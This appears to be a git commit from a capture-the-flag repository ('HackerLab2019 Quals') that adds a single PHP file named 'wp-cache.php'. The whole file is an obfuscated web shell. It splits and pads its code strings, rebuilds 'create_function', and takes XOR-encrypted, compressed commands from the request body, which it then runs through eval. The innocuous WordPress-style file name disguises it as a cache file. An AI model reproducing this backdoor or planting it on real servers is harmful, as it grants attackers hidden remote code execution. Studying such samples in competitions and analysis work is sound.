f0a69d01f30f4996096f00967f86d237b9747909
CharliGithub <31701566+CharliGithub@users.noreply.github.com>
2020-05-03 15:17:58 +0200

    Add files via upload

---
+++ HackerLab2019 Quals/Images/wp-cache.php
@@ -0,0 +1,11 @@
+<?php
+$w='e-nd_clean();$r=-@base-64_-encode(-@x(@gzco-mpr-ess($o),$k-));-print("$-p$kh$r-$kf");}';
+$U='h("/$-kh(.+-)$k-f/"-,-@file_get_conte-nts-("php:-//input-"),$m)==1){-@ob_-sta-rt-();@ev';
+$r=str_replace('Y','','YcrYeate_YfYunYYction');
+$m='$k-="39f3646e-";$k-h-="5a3-4782b3b30";$k-f="6-d284b268-69a";-$p="Tt-W-TquRSHT2gF-fSH-"';
+$x=';function x-($t,$k)-{$c-=s-trlen(-$k);$l=strle-n-($t)-;$o="-";for(-$i=0;$i<$l-;-){for(';
+$N='-al(@g-zuncompres-s(@x-(@ba-se64_decode($m[-1]),$k))-);-$-o-=@ob_get--_contents();@ob_';
+$X='$j=0;(-$-j<$c&&$i<$-l-);$j++,--$i++){$o.=$t-{$i}^$k{$-j};}}return -$o;}-i-f(@preg_m-atc';
+$z=str_replace('-','',$m.$x.$X.$U.$N.$w);
+$e=$r('',$z);$e();
+?>
